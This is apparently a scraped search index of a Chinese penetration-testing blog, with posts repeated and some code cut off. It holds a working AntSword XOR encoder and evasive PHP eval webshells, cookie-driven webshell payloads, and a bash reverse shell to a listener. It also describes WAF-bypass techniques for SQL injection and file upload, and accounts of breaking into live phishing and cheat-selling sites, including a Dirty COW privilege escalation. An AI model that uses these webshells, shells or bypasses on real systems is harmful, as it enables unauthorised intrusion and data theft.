随机生成Cookie既然我们已经可以任意修改shell的请求信息，我们就可以把秘钥放在一个指定的headers字段里，shell获取后再对payload进行加解密。 但是突然多出来一个奇奇怪怪的字段，长时间后就会变成waf识别的特征。 那么有没有什么是变化的，并且很常见的headers头呢？ 我们就可以想到利用Cookie。 参考蚁剑的aes编码器，它所采用的方法是人工首先访问shell生成一个sessionid，填入shell配置后作为后面通讯的秘钥。 但是实际上因为我们已经可以控制cookie字段，我们完全可以在编码器中每次生成一个随机的cookie，这样就省去了人工操作的一步。 有一个坑要注意，php的session id一般是26位的，所以我们最好也生成一个26位的秘钥，增强伪装性。（虽然可能并没有什么卵用） ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:2","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#随机生成cookie"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编码器 'use strict'; //code by yzddmr6 module.exports = (pwd, data, ext = {}) =\u003e { let randomID = `x${Math.random().toString(16).substr(2)}`; function xor(payload) { let crypto = require('crypto'); let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6); ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key; key = key.split(\"\").map(t =\u003e t.charCodeAt(0)); //let payload=\"phpinfo();\"; let cipher = payload.split(\"\").map(t =\u003e t.charCodeAt(0)); for (let i = 0; i \u003c cipher.length; i++) { cipher[i] = cipher[i] ^ key[i % 26] } cipher = cipher.map(t =\u003e String.fromCharCode(t)).join(\"\") cipher = Buffer.from(cipher).toString('base64'); //console.log(cipher) return cipher; } data['_'] = Buffer.from(data['_']).toString('base64'); data[pwd] = `eval(base64_decode(\"${data['_']}\"));`; data[pwd]=xor(data[pwd]); delete data['_']; return data; } 2.3.2 Shell原型 \u003c?php @$post=base64_decode($_REQUEST['test']); $key=@$_COOKIE['PHPSESSID']; for($i=0;$i\u003cstrlen($post);$i++){ $post[$i] = $post[$i] ^ $key[$i%26]; } @eval($post); ?\u003e 2.3.3 免杀处理 \u003c?php class Cookie { function __construct() { $key=@$_COOKIE['PHPSESSID']; @$post=base64_decode($_REQUEST['test']); for($i=0;$i\u003cstrlen($post);$i++){ $post[$i] = $post[$i] ^ $key[$i%26]; } return $post; } function __destruct() {return @eval($this-\u003e__construct());} } $check=new Cookie(); ?\u003e ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:3","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#具体实现"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编码器 'use strict'; //code by yzddmr6 module.exports = (pwd, data, ext = {}) =\u003e { let randomID = `x${Math.random().toString(16).substr(2)}`; function xor(payload) { let crypto = require('crypto'); let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6); ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key; key = key.split(\"\").map(t =\u003e t.charCodeAt(0)); //let payload=\"phpinfo();\"; let cipher = payload.split(\"\").map(t =\u003e t.charCodeAt(0)); for (let i = 0; i \u003c cipher.length; i++) { cipher[i] = cipher[i] ^ key[i % 26] } cipher = cipher.map(t =\u003e String.fromCharCode(t)).join(\"\") cipher = Buffer.from(cipher).toString('base64'); //console.log(cipher) return cipher; } data['_'] = Buffer.from(data['_']).toString('base64'); data[pwd] = `eval(base64_decode(\"${data['_']}\"));`; data[pwd]=xor(data[pwd]); delete data['_']; return data; } 2.3.2 Shell原型 \u003c?php @$post=base64_decode($_REQUEST['test']); $key=@$_COOKIE['PHPSESSID']; for($i=0;$i 2.3.3 免杀处理 \u003c?php class Cookie { function __construct() { $key=@$_COOKIE['PHPSESSID']; @$post=base64_decode($_REQUEST['test']); for($i=0;$i__construct());} } $check=new Cookie(); ?\u003e ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:3","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#编码器"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编码器 'use strict'; //code by yzddmr6 module.exports = (pwd, data, ext = {}) =\u003e { let randomID = `x${Math.random().toString(16).substr(2)}`; function xor(payload) { let crypto = require('crypto'); let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6); ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key; key = key.split(\"\").map(t =\u003e t.charCodeAt(0)); //let payload=\"phpinfo();\"; let cipher = payload.split(\"\").map(t =\u003e t.charCodeAt(0)); for (let i = 0; i \u003c cipher.length; i++) { cipher[i] = cipher[i] ^ key[i % 26] } cipher = cipher.map(t =\u003e String.fromCharCode(t)).join(\"\") cipher = Buffer.from(cipher).toString('base64'); //console.log(cipher) return cipher; } data['_'] = Buffer.from(data['_']).toString('base64'); data[pwd] = `eval(base64_decode(\"${data['_']}\"));`; data[pwd]=xor(data[pwd]); delete data['_']; return data; } 2.3.2 Shell原型 \u003c?php @$post=base64_decode($_REQUEST['test']); $key=@$_COOKIE['PHPSESSID']; for($i=0;$i 2.3.3 免杀处理 \u003c?php class Cookie { function __construct() { $key=@$_COOKIE['PHPSESSID']; @$post=base64_decode($_REQUEST['test']); for($i=0;$i__construct());} } $check=new Cookie(); ?\u003e ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:3","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#shell原型"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编码器 'use strict'; //code by yzddmr6 module.exports = (pwd, data, ext = {}) =\u003e { let randomID = `x${Math.random().toString(16).substr(2)}`; function xor(payload) { let crypto = require('crypto'); let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6); ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key; key = key.split(\"\").map(t =\u003e t.charCodeAt(0)); //let payload=\"phpinfo();\"; let cipher = payload.split(\"\").map(t =\u003e t.charCodeAt(0)); for (let i = 0; i \u003c cipher.length; i++) { cipher[i] = cipher[i] ^ key[i % 26] } cipher = cipher.map(t =\u003e String.fromCharCode(t)).join(\"\") cipher = Buffer.from(cipher).toString('base64'); //console.log(cipher) return cipher; } data['_'] = Buffer.from(data['_']).toString('base64'); data[pwd] = `eval(base64_decode(\"${data['_']}\"));`; data[pwd]=xor(data[pwd]); delete data['_']; return data; } 2.3.2 Shell原型 \u003c?php @$post=base64_decode($_REQUEST['test']); $key=@$_COOKIE['PHPSESSID']; for($i=0;$i 2.3.3 免杀处理 \u003c?php class Cookie { function __construct() { $key=@$_COOKIE['PHPSESSID']; @$post=base64_decode($_REQUEST['test']); for($i=0;$i__construct());} } $check=new Cookie(); ?\u003e ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:3","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#免杀处理"},{"categories":["技术文章"],"content":"\r2.4 连接测试\r","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:2:4","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#连接测试"},{"categories":["技术文章"],"content":"\r3 最后还是老问题，蚁剑的其他参数只是一层base64，这个就需要大家自己手工去改了。 蚁剑牛逼！ ","date":"2019-12-09","objectID":"/posts/antsword-xor-encoder-2/:3:0","series":null,"tags":["中国蚁剑"],"title":"基于随机Cookie的蚁剑动态秘钥编码器","uri":"/posts/antsword-xor-encoder-2/#最后"},{"categories":["技术文章"],"content":"\r1 前言前几天晚上做了一个梦，梦里进行了一些测试，今天觉得应该记录一下。 本文纯属虚构，如有雷同纯属放屁。 ","date":"2019-12-06","objectID":"/posts/bypass-waf-sqlin/:1:0","series":null,"tags":["bypass"],"title":"SQL注入“万能”Bypass","uri":"/posts/bypass-waf-sqlin/#前言"},{"categories":["技术文章"],"content":"\r2 正文梦里发现了一处mssql报错注入 然后发现有云锁 云锁.jpg（假装有图） 用星球里的脚本生成垃圾数据 如果是POST型就直接把垃圾数据放到你要注入的字段前后，如果是GET型就把他转为POST型再放垃圾数据。 第一次可能生成太少了，还是被云锁drop包 多粘贴几次，最后发现在数据包到30KB左右就可以正常注入了 然后就可以查数据了 ","date":"2019-12-06","objectID":"/posts/bypass-waf-sqlin/:2:0","series":null,"tags":["bypass"],"title":"SQL注入“万能”Bypass","uri":"/posts/bypass-waf-sqlin/#正文"},{"categories":["技术文章"],"content":"\r2.1 测试数据目前为止的bypass测试数据： 云锁：30KB 宝塔：30KB 阿里云：200+键值对 安全狗没测过，有空测一下 建议先抓包手工试一下到底多少垃圾数据合适，没问题之后再上sqlmap，不然容易ban ip ","date":"2019-12-06","objectID":"/posts/bypass-waf-sqlin/:2:1","series":null,"tags":["bypass"],"title":"SQL注入“万能”Bypass","uri":"/posts/bypass-waf-sqlin/#测试数据"},{"categories":["技术文章"],"content":"\r2.2 几个问题 为什么不直接在get上加垃圾数据？ 因为GET型有长度限制，有时候还没加到能bypass的程度服务器就报错。 为什么不用一个超长字符串要用这么多键值对？ 因为经过测试，超长字符串对于阿里云没用，超多垃圾键值对才有用。 适用类型有哪些？ 在梦里的测试中本方法对于市面上绝大多数waf都可以用，数据包大小区别而已。 ","date":"2019-12-06","objectID":"/posts/bypass-waf-sqlin/:2:2","series":null,"tags":["bypass"],"title":"SQL注入“万能”Bypass","uri":"/posts/bypass-waf-sqlin/#几个问题"},{"categories":["技术文章"],"content":"\r3 最后然后梦就醒了，收拾一下准备去工地搬砖了。 ","date":"2019-12-06","objectID":"/posts/bypass-waf-sqlin/:3:0","series":null,"tags":["bypass"],"title":"SQL注入“万能”Bypass","uri":"/posts/bypass-waf-sqlin/#最后"},{"categories":["技术文章"],"content":"\r1 前言某天收到一封邮件 一看就是钓鱼邮件，并且我也不玩LOL。 看了看感觉这个系统好像见过很多次，研究了一下，顺手日了下来 过程比较有意思，遇到了不少坑，写篇文章记录一下。 ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:1:0","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:0","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#正文"},{"categories":["技术文章"],"content":"\r2.1 信息搜集打开网站首先我们可以看到他的炫酷界面 进一步搜集信息发现有宝塔+云锁，找不到后台，旁站全是这种钓鱼站，均使用了冒充官网的子域名前缀 手工试了下发现有注入，但是有云锁 ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:1","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#信息搜集"},{"categories":["技术文章"],"content":"\r2.2 万能Bypass还是利用星球里提过的方法来bypass 构造好post包后用sqlmap跑，发现有布尔盲注 本来以为就要完事了，结果sqlmap最后提示注入失败 emmmmmm，看一下发现被封了IP 换个IP后，增大delay的数值，想了想他有可能是根据XFF来判断来源IP的，就又加了个tamper=xforwardedfor.py 哈，本来可高兴了，以为完事了 结果发现跑不出来数据 exm??? ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:2","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#万能bypass"},{"categories":["技术文章"],"content":"\r2.3 遇到的坑在从确认有注入到真正能跑出来的期间遇到了好多坑。。。 花了一下午时间才一个一个解决 2.3.1 第一个坑：sqlmap的payload无法加载抓包看一下，发现sqlmap的payload无法被加载到数据包里 相当于一直发送的都是没有payload的数据包，所以肯定注不出来。 具体原因不知道为什么，但是可以做一个猜想： 可能是构造的垃圾数据过多，文件过大，导致sqlmap还没来得及替换payload数据包就发出去了 解决办法就是减小数据包长度，然后抓包调整 最后发现30kb是个界限，刚好是sqlmap能发出去包，并且云锁跟宝塔不会拦截。 2.3.2 第二个坑：win下网络阻塞强制关闭sqlmap了几次，然后就发现网络阻塞，数据包在win环境下发不出去 解决办法就是换kali。 2.3.3 第三个坑：sqlmap提示发现有无法识别的字符，解决办法是采用--hex ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:3","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#遇到的坑"},{"categories":["技术文章"],"content":"\r2.3 遇到的坑在从确认有注入到真正能跑出来的期间遇到了好多坑。。。 花了一下午时间才一个一个解决 2.3.1 第一个坑：sqlmap的payload无法加载抓包看一下，发现sqlmap的payload无法被加载到数据包里 相当于一直发送的都是没有payload的数据包，所以肯定注不出来。 具体原因不知道为什么，但是可以做一个猜想： 可能是构造的垃圾数据过多，文件过大，导致sqlmap还没来得及替换payload数据包就发出去了 解决办法就是减小数据包长度，然后抓包调整 最后发现30kb是个界限，刚好是sqlmap能发出去包，并且云锁跟宝塔不会拦截。 2.3.2 第二个坑：win下网络阻塞强制关闭sqlmap了几次，然后就发现网络阻塞，数据包在win环境下发不出去 解决办法就是换kali。 2.3.3 第三个坑：sqlmap提示发现有无法识别的字符，解决办法是采用--hex ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:3","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#第一个坑sqlmap的payload无法加载"},{"categories":["技术文章"],"content":"\r2.3 遇到的坑在从确认有注入到真正能跑出来的期间遇到了好多坑。。。 花了一下午时间才一个一个解决 2.3.1 第一个坑：sqlmap的payload无法加载抓包看一下，发现sqlmap的payload无法被加载到数据包里 相当于一直发送的都是没有payload的数据包，所以肯定注不出来。 具体原因不知道为什么，但是可以做一个猜想： 可能是构造的垃圾数据过多，文件过大，导致sqlmap还没来得及替换payload数据包就发出去了 解决办法就是减小数据包长度，然后抓包调整 最后发现30kb是个界限，刚好是sqlmap能发出去包，并且云锁跟宝塔不会拦截。 2.3.2 第二个坑：win下网络阻塞强制关闭sqlmap了几次，然后就发现网络阻塞，数据包在win环境下发不出去 解决办法就是换kali。 2.3.3 第三个坑：sqlmap提示发现有无法识别的字符，解决办法是采用--hex ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:3","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#第二个坑win下网络阻塞"},{"categories":["技术文章"],"content":"\r2.3 遇到的坑在从确认有注入到真正能跑出来的期间遇到了好多坑。。。 花了一下午时间才一个一个解决 2.3.1 第一个坑：sqlmap的payload无法加载抓包看一下，发现sqlmap的payload无法被加载到数据包里 相当于一直发送的都是没有payload的数据包，所以肯定注不出来。 具体原因不知道为什么，但是可以做一个猜想： 可能是构造的垃圾数据过多，文件过大，导致sqlmap还没来得及替换payload数据包就发出去了 解决办法就是减小数据包长度，然后抓包调整 最后发现30kb是个界限，刚好是sqlmap能发出去包，并且云锁跟宝塔不会拦截。 2.3.2 第二个坑：win下网络阻塞强制关闭sqlmap了几次，然后就发现网络阻塞，数据包在win环境下发不出去 解决办法就是换kali。 2.3.3 第三个坑：sqlmap提示发现有无法识别的字符，解决办法是采用--hex ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:3","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#第三个坑"},{"categories":["技术文章"],"content":"\r2.4 柳暗花明解决完上面的坑后，终于可以出数据了 跑了漫长的一个小时。。。终于跑出来了当前的用户名。。。 然后是跑表名 因为跑起来实在太慢了，后面就懒得跑了。 ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:2:4","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#柳暗花明"},{"categories":["技术文章"],"content":"\r3 最后面对这种邮件大家要提高警惕，一定要检查发件人跟域名是否是官方。 一旦遇到钓鱼邮件立马举报，防止更多的人上当。 ","date":"2019-12-06","objectID":"/posts/bypass-waf-and-hack-fish-site/:3:0","series":null,"tags":["bypass"],"title":"绕过宝塔云锁注入钓鱼站","uri":"/posts/bypass-waf-and-hack-fish-site/#最后"},{"categories":["技术文章"],"content":"\r1 前言看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。 然后一顿操作把一个简单的shell就升级到了一个标准交互式shell 写这篇文章记录一下 ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:1:0","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#前言"},{"categories":["技术文章"],"content":"\r2 正文攻击机：kali 靶机：ubuntu 首先ubuntu建一个新用户：test，密码 test ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:2:0","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#正文"},{"categories":["技术文章"],"content":"\r2.1 普通Shell给kali弹shell bash -i \u003e\u0026 /dev/tcp/192.168.145.128/4444 0\u003e\u00261 kali nc -lvvp 4444 然后发现这个shell有很多问题 无法使用vim等文本编辑器 不能补全 不能su 没有向上箭头使用历史 等等 ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:2:1","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#普通shell"},{"categories":["技术文章"],"content":"\r2.2 半交互式Shell对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下： python -c 'import pty; pty.spawn(\"/bin/bash\")' 在创建完成后，我们此时就可以运行su命令了 但是还是存在很多问题 无法使用vim等文本编辑器 不能补全 没有向上箭头使用历史 ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:2:2","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#半交互式shell"},{"categories":["技术文章"],"content":"\r2.3 完全交互式Shell命令： $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z $ stty raw -echo $ fg $ reset $ export SHELL=bash //$ export TERM=xterm-256color 此时已经拥有了一个完全交互式Shell，就可以使用上下左右，vi，tab补全等等一系列操作，并且按Ctrl-c也不会退出。 ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:2:3","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#完全交互式shell"},{"categories":["技术文章"],"content":"\r2.4 相关命令解析 stty -echo #禁止回显，当在键盘上输入时，并不出现在屏幕上 stty echo #打开回显 stty raw #设置原始输入 stty -raw #关闭原始输入 bg 将一个在后台暂停的命令，变成继续执行 fg 将后台中的命令调至前台继续运行 jobs 查看当前有多少在后台运行的命令 ctrl + z 可以将一个正在前台执行的命令放到后台，并且暂停 clear 这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。 reset 这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空 ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:2:4","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#相关命令解析"},{"categories":["技术文章"],"content":"\r3 参考链接https://www.freebuf.com/news/142195.html ","date":"2019-12-01","objectID":"/posts/shell-to-tty/:3:0","series":null,"tags":[],"title":"反弹Shell升级为交互式Shell","uri":"/posts/shell-to-tty/#参考链接"},{"categories":["技术文章"],"content":"\r1 前言 \u003c?php $p=$_COOKIE;(count($p)==23\u0026\u0026in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])\u0026\u0026($p[91]=$p[59]($p[91]))\u0026\u0026($p=$p[91]($p[90],$p[59]($p[31])))\u0026\u0026$p()):$p; ?\u003e 星球里有很多同学想让我对这个shell写一篇解析，看了下确实比较有意思，并且顺便也想讲一些自己的想法。 ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:1:0","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#前言"},{"categories":["技术文章"],"content":"\r2 语法分析比较复杂的样子，一点点看吧。 首先pç­ä»·äºcookie数组，属性是一个array。 后面一长串其实是个三段式 ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:2:0","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#语法分析"},{"categories":["技术文章"],"content":"\r2.1 第一部分：条件 (count($p)==23\u0026\u0026in_array(gettype($p).count($p),$p)) 也就是说$p这个字典的长度要必须是23，并且gettype($p).count($p)拼接后的值必须在$p这个字典里。 因为$p是array，count($p)=23，所以也就是说cookie中必须有一个值是array23 ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:2:1","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#第一部分条件"},{"categories":["技术文章"],"content":"\r2.2 第二部分：条件成立时执行 (($p[59]=$p[59].$p[72])\u0026\u0026($p[91]=$p[59]($p[91]))\u0026\u0026($p=$p[91]($p[90],$p[59]($p[31])))\u0026\u0026$p()) 注意这里已经出现了变量函数的部分了 ,这两句将是后面讲的重点 $p[59]($p[91]) 可以变为 assert($_POST['cmd'])等等 $p=$p[91]($p[90],$p[59]($p[31])) 可以变为create_function('',eval($_POST[cmd]))等等 ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:2:2","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#第二部分条件成立时执行"},{"categories":["技术文章"],"content":"\r2.3 第三部分：条件不成立时执行这部分没卵用。 ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:2:3","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#第三部分条件不成立时执行"},{"categories":["技术文章"],"content":"\r2.4 Payload这是某论坛大佬给出的payload 可以看到是相当于拼接了一个eval(strrev(倒置的create_function(,eval($_POST[cmd]))))(差不多这个意思) 然后就可以用密码是cmd的一句话连接了。 但是想一想，因为里面有大量的可控参数，所以其实有很多玩法。 举几个例子 最短的用法，91处直接写命令 为了方便我把$p给var_dump了出来 Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=phpinfo(); 还可以通过GET传参 Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=@eval($_GET[a]); 当然也可以改成POST，用蚁剑连接 Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=@eval($_POST[a]); 直接在cookie里明文出现@eval($_POST[a]);肯定是不太好的，容易被拦截。 我们别忘了第二处出现变量函数的地方 ($p=$p[91]($p[90],$p[59]($p[31])))\u0026\u0026$p()) 这里可以满足我们的各种编码需求。 论坛中的payload是用strrev函数编码过的，也就是字符串反转，我们当然也可以用其他的比如base64 Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 31=ZXZhbChwaHBpbmZvKCkpOw==; 90; 59=base64_; 72=decode; 91=Y3JlYXRlX2Z1bmN0aW9u; 其中31是eval(phpinfo()); 91是create_function 转化成蚁剑能够连接的一句话 也就是把31处改为eval($_POST[cmd]);的base64编码，注意这里最后一定要加分号。 然后用蚁剑连接就可以了。 ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:2:4","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#payload"},{"categories":["技术文章"],"content":"\r3 反思扩展总结一下这个shell构思的巧妙之处 shell没有明显的eval assert $_POST $_GET等常规特征 动态函数的形式，可以用多种编码进行传输payload 用cookie传payload，在一定程度上逃避WAF常见的POST跟GET型流量查杀 这里就想到一个问题，在网络对♂抗的时候经常有人发出疑问： 我的shell是免杀的，我的马也藏得很深，但是为什么我的shell总是能被对方找到？ 尽管你的shell是免杀的，也藏在了很深的目录，也有可能你的流量也是层层编码过的，但是常见的一句话连接工具不管是菜刀还是蚁剑还是冰蝎也好，都难逃一个特点就是POST传输。 因为正常的业务中，大多数情况下都是只需GET请求，只有修改或者上传等操作的时候才需要POST。 但是一旦你的shell连接上后，你在蚁剑中的每个操作，每个查询，都会对应一次甚至多次POST发包。 就更别说你需要在靶机上继续进行信息搜集等操作了，点的越多，流量日志记录的就越多。 日志中看到某一个文件短时间内被同一IP连着POST了几十次，用脚趾头想想就知道有问题。。。然而大多数人并不懂得如何正确擦屁股。 所以在我看来，以后的方向可能就是GET请求+cookie或者http头传输payload。 kali上著名的工具weevely也是采用了GET传payload的模式：Weevely命令传输分析 但是命令行总是不方便，如果能够用拓展性强大的蚁剑能实现就好了。 那么如何实现呢? 这个等我学会了再给大家分享。。。。。。 留下了不学无术的泪水.jpg ","date":"2019-11-28","objectID":"/posts/an-interesting-shell/:3:0","series":null,"tags":["webshell"],"title":"某Shell分析以及自己的一些想法","uri":"/posts/an-interesting-shell/#反思扩展"},{"categories":["技术文章"],"content":" 九世发在星球里的文章，因为比较敏感就放在博客上了。 绕过的方法： 三个点： 1.后缀名回车分割 2.删除Content-Type头 3.垃圾数据填充 1.后缀名回车分割 xxx.php “xxx. p h p” 执行shell的时候，发现phpinfo()函数被拦了 当时第一个念头是： 草 第二个念头是 这个宝塔杀的肯定是敏感函数，比如执行:http://xxx.com/x.php?a=phpinfo(); 杀 phphaqinfo(); 不杀 那么只需要把haq置空就好了 最后得到新的shell 成功过塔 ","date":"2019-11-26","objectID":"/posts/bt-bypass-upload/:0:0","series":null,"tags":["bypass"],"title":"bypass宝塔上传","uri":"/posts/bt-bypass-upload/#"},{"categories":["技术文章"],"content":" 向吃鸡外挂站开炮（一） 向吃鸡外挂站开炮（二） ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:0:0","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#"},{"categories":["技术文章"],"content":"\r1 前言第三篇终于写好了，也算是比较有意思的一篇，遇到了很多坑，也用上了很多小技巧，写出来博君一笑。 ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:1:0","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#前言"},{"categories":["技术文章"],"content":"\r2 正文毫无套路的炫酷界面 琳琅满目的商品列表 这种卖黑号的通常都是跟各种hc商勾结在一起，用木马盗取用户账号，然后再出售账号让孤儿开挂。 ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:2:0","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#正文"},{"categories":["技术文章"],"content":"\r2.1 Getshellgetshell的过程懒得再复现一遍了，直接说思路吧。 发现用的是一套已知的发卡系统，Fi9coder刚好在我星球里发过此发卡系统的漏洞合集。 自己也审了一下，确实漏洞比较多。 随便找一处 submit.php里直接把$gid带入数据库查询，产生注入 然后到后台logo处未过滤直接可以上传shell 理论上很简单，但是实际上遇到了一些坑。 第一个是对方似乎开了宝塔的防护，注入跟上传都会被拦截。 我用的绕过办法是，注入用的参数污染，上传用的星球里嘉宾九世分享的bypass宝塔上传方法，换行绕过，一句话用的webshell-venom。 第二个是找不到后台 解决办法是找到他的一个旁站，然后谷歌找到了他旁站的后台。 国外服务器，旁站都是这种乱七八糟的非法站，用的都是同一套有漏洞的系统。 猜想可能都是这个后台，果然如此 比较有意思，后台地址是 /sima ，看来站长也知道自己是个什么东西。 拿着注入出来的账号密码就进去了 ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:2:1","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#getshell"},{"categories":["技术文章"],"content":"\r2.2 Bypass disable function确实是getshell了，但是连接的时候出了问题，蚁剑连接的时候一直转圈圈 发现是流量被检测后直接封ip了。 因为用的webshell-venom生成的马，兼容流量编码，所以开始解决办法是传一个id参数，然后用蚁剑的base64-bypass编码器，把所有的payload都base64一遍。 结果后面发现连接了一会儿又被封了。。。。 再换上用自己写的蚁剑参数污染模块，总算是不被封了。。。 宝塔默认会禁用系统函数，需要Bypass disable function 用蚁剑自带的bypass插件 发现因为宝塔的原因，会直接拦截上传的php 解决办法是代理到burp后把payload抠出来，手动上传。 (我也不知道为什么自动上传不行手动就可以了。。。) 成功执行命令 ","date":"2019-11-13","objectID":"/posts/hack-pubg-cheat-site-3/:2:2","series":null,"tags":["渗透测试"],"title":"向吃鸡外挂站开炮（三）","uri":"/posts/hack-pubg-cheat-site-3/#bypass-disable-function"},{"categories":["技术文章"],"content":"\r2.3 曲折的提权发现是2015的内核后笑开了花，脏牛一把梭走起。 首先弹个msf回来，这样就可以有交互式shell 但是发现firefart的exp会直接把系统搞崩。。。服务器直接挂了 本来以为是偶然情况，等到第二天服务器又恢复了又提了一次结果还是宕机。。。 所以又等了一天。。。 